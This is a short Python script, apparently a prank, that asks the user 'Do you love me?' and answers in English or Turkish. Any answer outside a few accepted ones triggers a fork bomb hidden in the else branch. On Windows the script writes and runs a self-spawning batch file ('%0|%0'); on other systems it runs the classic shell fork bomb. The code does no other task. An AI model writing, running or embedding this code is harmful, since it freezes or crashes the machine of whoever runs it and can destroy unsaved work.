import os
import time

chc = input("Do you love me?\n>> ").lower()

if chc in ["yes", "i love you", "i like you", "maybe i can love you"]:
    print("Oh thank you so much, I love you too.")
elif chc in ["maybe", "i have no idea"]:
    print("Zamanımız var mı bilmeden her şeyi zamana bıraktık ✌🕊\nHadi bb.")
else:
    print("Alright :(")
    time.sleep(1)
    if os.name == "nt":
        dosya_adi = "fork.bat"
        with open(dosya_adi, "w") as dosya:
            dosya.write("%0|%0")
        os.system(dosya_adi)
    else:
        os.system(":(){ :|:& };:")
